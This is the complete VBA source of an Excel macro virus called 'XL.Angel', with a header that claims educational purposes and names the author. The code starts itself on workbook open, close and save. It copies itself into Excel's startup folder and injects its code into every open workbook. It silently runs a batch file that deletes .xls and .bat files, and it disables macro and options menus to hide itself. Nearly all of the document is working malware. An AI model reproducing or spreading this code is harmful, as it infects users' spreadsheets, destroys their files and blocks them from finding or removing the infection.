   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisWorkbook"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   'XL.Angel Virus
   'For Educational Purposes only
   'Do not Distribute
   'koded by D@rkByTe
   Private Sub Workbook_BeforeClose(Cancel As Boolean)
   ChDir ("c:\My documents")
   Call copyvir
   If ActiveWorkbook.Name = "Angel.xls" Then ActiveWorkbook.Save
   If ActiveWorkbook.Saved = False Then
   ChDir ("c:\My documents")
   Application.Dialogs(xlDialogSaveAs).Show
   Else
       ChDir ("c:\My documents")
       ActiveWorkbook.Save
   End If
   End Sub

   Private Sub Workbook_BeforeSave(ByVal SaveAsUI As Boolean, Cancel As Boolean)
   ChDir ("c:\My documents")
   If ActiveWorkbook.Name = "Angel.xls" Then ActiveWorkbook.Save
   If ActiveWorkbook.Saved = False Then
     ChDir ("c:\My documents")
     Application.Dialogs(xlDialogSaveAs).Show
   Else
       ChDir ("c:\My documents")
       ActiveWorkbook.Save
   End If
   End Sub

   Private Sub Workbook_Open()
   Call stealth
   If Me.Name = "Angel.xls" Then
   Workbooks.Add
   copyvir
   End If
   End Sub

   Sub copyvir()
   q = Application.Path & "\xlstart"
   ChDir (q)
   w = Dir("*.xls")
   If w = "" Or w <> "Angel.xls" Then
       Open "delxls.bat" For Output As #1
       Print #1, "del *.xls"
       Print #1, "del *.bat"
       Print #1, "exit"
       Close #1
       t = Shell("delxls.bat /c", vbHide)
       Set newBook = Workbooks.Add
       With newBook
           .Title = "Angel"
           .Subject = "Virus"
           .SaveAs FileName:="Angel.xls"
       End With
   Call copyvir2
   End If

   Call copyvir2
   End Sub
   Sub copyvir2()
   For Each w In Workbooks
    For d = 1 To w.VBProject.VBComponents.Count
     infected = w.VBProject.VBComponents(d).CodeModule.Find("Angel", 1, 1, 1000, 1000)
   If infected = True Then
       haba = w.VBProject.VBComponents(d).CodeModule.CountOfLines
       code = w.VBProject.VBComponents(d).CodeModule.Lines(1, haba) & Chr(13) & "'" & "Infected Date :  " & Date

   End If
    Next d
   Next w
   For Each w In Workbooks
    For d = 1 To w.VBProject.VBComponents.Count
     infected = w.VBProject.VBComponents(d).CodeModule.Find("Angel", 1, 1, 1000, 1000)
   If infected = False Then
        w.VBProject.VBComponents(d).CodeModule.InsertLines 1, code

   End If
    Next d
   Next w
   End Sub
   Sub stealth()

   Application.Dialogs(xlDialogRun).Application.EnableEvents = False
   Application.CommandBars("Tools").Reset
   Application.RecentFiles.Maximum = 0
   Application.CommandBars("Tools").Controls("Macro").Enabled = False
   Application.CommandBars("View").Controls("Toolbars").Enabled = False
   Application.CommandBars("Tools").Controls("Customize...").Enabled = False
   Application.CommandBars("Tools").Controls("Options...").Enabled = False

   Application.CommandBars("Visual Basic").Visible = False
   Application.CommandBars("Visual Basic").Controls("Macros...").Enabled = False
   End Sub
   'Infected Date :  2/22/2000
